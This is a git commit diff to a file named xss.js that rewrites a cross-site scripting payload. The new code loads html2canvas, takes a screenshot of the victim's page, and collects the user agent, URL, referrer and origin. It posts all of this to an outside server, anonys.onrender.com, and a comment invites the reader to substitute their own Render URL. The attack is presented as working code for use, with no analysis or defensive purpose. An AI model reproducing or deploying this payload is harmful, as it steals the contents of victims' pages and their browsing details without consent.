d958c8982c174303087183228bd213563184c7d1
muthudakl <skullgaming720@gmail.com>
2025-05-17 13:11:00 +0530

    Update xss.js

--- static/xss.js
+++ static/xss.js
@@ -1,24 +1,32 @@
-(function() {
-  let sendLog = (imgData) => {
-    fetch("/log", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ screenshot: imgData })
-    });
-  };
-
-  let capture = () => {
-    let script = document.createElement("script");
-    script.src = "/html2canvas.min.js";
-    script.onload = () => {
-      setTimeout(() => {
-        html2canvas(document.body).then(canvas => {
-          sendLog(canvas.toDataURL("image/png"));
+(function(){
+  function runPayload(){
+    try {
+      html2canvas(document.body).then(function(canvas){
+        var screenshot = canvas.toDataURL('image/png');
+        var payload = {
+          screenshot: screenshot,
+          userAgent: navigator.userAgent,
+          url: window.location.href,
+          time: new Date().toISOString(),
+          referrer: document.referrer,
+          origin: window.location.origin
+        };
+        fetch('https://anonys.onrender.com/log', {   // <-- Change this to your Render URL!
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(payload),
+          keepalive: true
         });
-      }, 1000);
-    };
-    document.body.appendChild(script);
-  };
+      });
+    } catch(e){}
+  }
 
-  capture();
+  if(typeof html2canvas === 'undefined'){
+    var script = document.createElement('script');
+    script.src = '/html2canvas.min.js';
+    script.onload = runPayload;
+    document.head.appendChild(script);
+  } else {
+    runPayload();
+  }
 })();
